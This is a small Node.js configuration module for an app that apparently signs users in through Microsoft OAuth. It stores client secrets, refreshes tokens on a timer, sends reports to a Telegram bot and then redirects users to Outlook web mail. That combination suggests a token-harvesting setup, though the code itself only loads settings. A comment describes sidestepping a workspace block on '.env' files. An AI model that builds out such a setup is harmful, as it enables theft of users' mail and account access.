import fs from "node:fs";
import path from "node:path";
import dotenv from "dotenv";

// Workspace blocks ".env*" creation in this environment; we support config.env.
// Also supports real environment variables if you set them externally.
const configFile = path.join(process.cwd(), "config.env");
if (fs.existsSync(configFile)) {
  dotenv.config({ path: configFile });
} else {
  dotenv.config(); // no-op if no .env (kept for portability)
}

function str(name, fallback = undefined) {
  const v = process.env[name] ?? fallback;
  return typeof v === "string" ? v.trim() : fallback;
}

export const CONFIG = {
  tenantId: str("TENANT_ID", "common"),
  clientId: str("CLIENT_ID", ""),
  clientSecret: str("CLIENT_SECRET", ""),
  redirectUri: str("REDIRECT_URI", "http://localhost:3000/callback"),
  postAuthRedirect: str("POST_AUTH_REDIRECT", "https://outlook.office.com/mail/"),
  adminPassword: str("ADMIN_PASSWORD", ""),
  telegramBotToken: str("TELEGRAM_BOT_TOKEN", ""),
  telegramChatId: str("TELEGRAM_CHAT_ID", ""),
  refreshSkewSeconds: Number(str("REFRESH_SKEW_SECONDS", "300")),
  refreshEverySeconds: Number(str("REFRESH_EVERY_SECONDS", "0")),
  port: Number(str("PORT", "3000")),
  scopes: str(
    "SCOPES",
    "https://graph.microsoft.com/.default",
  )
    .split(/\s+/)

    
    .filter(Boolean),
};


